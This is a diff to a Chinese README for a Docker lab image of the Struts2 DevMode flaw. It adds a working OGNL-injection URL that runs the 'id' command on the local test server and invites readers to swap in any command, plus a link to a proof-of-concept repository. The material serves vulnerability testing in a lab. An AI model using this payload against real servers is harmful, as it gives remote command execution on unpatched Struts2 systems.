@@ -30,3 +30,21 @@ $ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-devmode
 ### 使用与利用
 
 访问 `https://你的 IP 地址:端口号/`
+
+#### Exp
+
+假定启动后的地址为：http://127.0.0.1:8080/
+
+执行 id 命令：
+
+```
+http://127.0.0.1:8080/orders/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id
+```
+
+> 修改参数 command 的值为你要执行的命令
+
+![](./exp-1.png)
+
+### 参考链接
+
+![S2-DevMode_CmdToolExP - coffeehb/Some-PoC-oR-ExP](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Struts2/S2-DevMode_CmdToolExP.py)
